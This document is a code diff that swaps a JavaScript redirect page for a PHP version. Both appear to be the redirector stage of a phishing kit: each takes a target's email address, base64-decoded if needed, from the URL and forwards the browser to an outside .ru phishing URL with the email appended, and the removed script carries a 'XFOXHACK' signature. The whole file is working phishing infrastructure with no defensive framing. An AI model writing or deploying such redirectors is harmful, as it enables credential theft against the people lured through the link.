@@ -1,40 +1,26 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Redirecting...</title>
-</head>
-<body>
-    <script>
-/* Add this to .htaccess if you want to use multiple argument in pubil html folder. file named .htaccess or create it
-RewriteEngine On
-RewriteRule ^[^/]+/try/(.*)$ /try/$1 [L] */
-
-var redirect_url = "https://eotn.liounglean.ru/b9b3w534/#"; // Change this to the URL you want to redirect to
-var path = window.location.href;  // Get the part of the URL after the domain name
-var parts = path.split('/#'); // Split the path by #
-// Check if there is a second part
-if (parts.length > 1) {
-// Get the email from the second part
-var email = parts[1];
-if (isBase64(email)) {
-email = atob(email);
-}
-// Redirect to the new URL with the email
-window.location.href = redirect_url + email;
-} else {
-// No email found, show an error message
-alert('Sorry! I cant find redirect for you');
+<?php
+function isBase64($data)
+{
+    if (base64_encode(base64_decode($data)) === $data) {
+        return true;
+    } else {
+        return false;
+    }
 }
 
-function isBase64(str) {
-try {
-return btoa(atob(str)) == str;
-} catch (err) {
-return false;
+function decode($email){
+        
+        if(isBase64($email)){
+             $email = base64_decode($email,false);
+        }
+      
+       header( "refresh:0;url=https://eotn.liounglean.ru/b9b3w534/#".$email);
+
 }
+if(isset($_GET['userid']) && !empty($_GET['userid'])){
+   $email = $_GET['userid'];
+   decode($email);
 }
-console.log("The path is: " + path);
-// XFOXHACK @icq
-</script>
-</body>
-</html>
+   
+   
+?>
